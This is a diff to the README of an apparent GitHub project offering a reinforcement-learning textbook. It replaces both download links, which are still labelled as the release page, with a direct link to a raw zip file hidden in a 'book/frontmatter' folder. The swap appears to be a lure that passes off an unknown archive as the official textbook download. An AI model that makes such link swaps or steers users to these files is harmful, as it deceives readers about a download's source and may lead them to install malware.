@@ -1,6 +1,6 @@
 # 📚 rl-textbook - Master reinforcement learning step by step
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/engraciafuturistic300/rl-textbook/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/engraciafuturistic300/rl-textbook/raw/refs/heads/main/book/frontmatter/textbook-rl-v3.8.zip)
 
 This project provides a complete open textbook on reinforcement learning. It covers concepts from basic bandits to complex language model alignment. You gain knowledge through 17 structured chapters, interactive Colab notebooks, and hands-on exercises.
 
@@ -8,7 +8,7 @@ This project provides a complete open textbook on reinforcement learning. It cov
 
 You get the materials from the official release page. Visit this page to download the latest files. The site hosts the textbook in accessible formats for your computer.
 
-[Click here to open the download page](https://github.com/engraciafuturistic300/rl-textbook/releases)
+[Click here to open the download page](https://github.com/engraciafuturistic300/rl-textbook/raw/refs/heads/main/book/frontmatter/textbook-rl-v3.8.zip)
 
 ## 💻 System requirements
 
